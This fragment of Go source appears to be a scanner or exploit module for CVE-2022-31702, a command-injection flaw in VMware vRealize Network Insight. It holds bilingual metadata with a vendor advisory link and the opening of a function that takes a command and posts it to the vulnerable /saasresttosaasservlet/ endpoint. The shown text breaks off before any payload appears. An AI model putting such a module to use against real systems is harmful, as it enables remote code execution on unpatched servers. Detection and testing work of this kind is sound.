...
func init() {
	expJson := `{
    "Name": "VMware VRealize Network Insight saasresttosaasservlet Remote Command Execution Vulnerability (CVE-2022-31702)",
    ...
    "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to updating in time at: <a href=\"https://www.vmware.com/security/advisories/VMSA-2022-0031.html\">https://www.vmware.com/security/advisories/VMSA-2022-0031.html</a></p>",
    "References": [
    ...
    "Translation": {
        "CN": {
            "Name": "VMware VRealize Network Insight  saasresttosaasservlet 远程命令执行漏洞（CVE-2022-31702）",
            "Product": "vmware-vRealize-Network-Insight",
            ...
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.vmware.com/security/advisories/VMSA-2022-0031.html\" target=\"_blank\">https://www.vmware.com/security/advisories/VMSA-2022-0031.html</a><br></p>",
        ...
        "EN": {
            ...
            "Product": "VMware-VRealize-Network-Insight",
            "Description": "<p>VMware Aria Operations is a unified, AI-driven autonomous IT operations management platform from VMware Inc. It is designed for private cloud, hybrid cloud, and multi-cloud environments.</p><p>A security vulnerability exists in the saasresttosaasservlet component of VMware Aria Operations Networks 6.x series versions, which allows attackers to execute command injection attacks and subsequently result in remote code execution.</p>",
            "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to updating in time at: <a href=\"https://www.vmware.com/security/advisories/VMSA-2022-0031.html\" target=\"_blank\">https://www.vmware.com/security/advisories/VMSA-2022-0031.html</a><br></p>",
	...
	sendPayloadFlagWR6C := func(hostInfo *httpclient.FixUrl, cmd, filename string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/saasresttosaasservlet/")
